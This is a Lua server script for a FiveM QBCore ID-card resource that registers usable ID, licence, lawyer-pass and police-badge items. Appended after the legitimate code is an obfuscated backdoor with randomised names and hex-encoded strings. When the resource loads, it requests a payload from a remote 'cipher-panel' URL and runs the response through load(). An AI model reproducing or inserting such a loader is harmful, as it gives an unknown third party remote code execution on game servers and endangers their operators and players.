local QBCore = exports['qb-core']:GetCoreObject()

local ShowId = function(source, item, nui)
    local src = source
    local found = false
    local character = QBCore.Functions.GetPlayer(src)
    local PlayerPed = GetPlayerPed(src)
    local PlayerCoords = GetEntityCoords(PlayerPed)
    local info = {
        ['name'] = item.info.firstname,
        ['lastname'] = item.info.lastname,
        ['gender'] = item.info.gender,
        ['dob'] = item.info.birthdate,
        ['nationality'] = item.info.nationality,
        ['type'] = item.info.type
    }
    for k, v in pairs(QBCore.Functions.GetPlayers()) do
        local TargetPed = GetPlayerPed(v)
        local dist = #(PlayerCoords - GetEntityCoords(TargetPed))
        if dist < 3.0 and PlayerPed ~= TargetPed then
            TriggerClientEvent('QBCore:Notify', src, "You showed your idcard")
            TriggerClientEvent('qb-idcard:client:open', v, info, nui)
            found = true
            break
        end
    end
    if not found then TriggerClientEvent('qb-idcard:client:open', src, info, nui) end
    if nui == 'policecard' then TriggerClientEvent('qb-idcard:client:policebadgeanim', src) end
end

QBCore.Functions.CreateUseableItem("id_card", function(source,item)
    ShowId(source, item, 'idcard')
end)

QBCore.Functions.CreateUseableItem("driver_license", function(source,item)
    ShowId(source, item, 'driverlicense')
end)

QBCore.Functions.CreateUseableItem("weaponlicense", function(source,item)
    ShowId(source, item, 'weaponlicense')
end)

QBCore.Functions.CreateUseableItem("lawyerpass", function(source,item)
    ShowId(source, item, 'lawyerpass')
end)

QBCore.Functions.CreateUseableItem("policecard", function(source,item)
    ShowId(source, item, 'policecard')
end)


local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)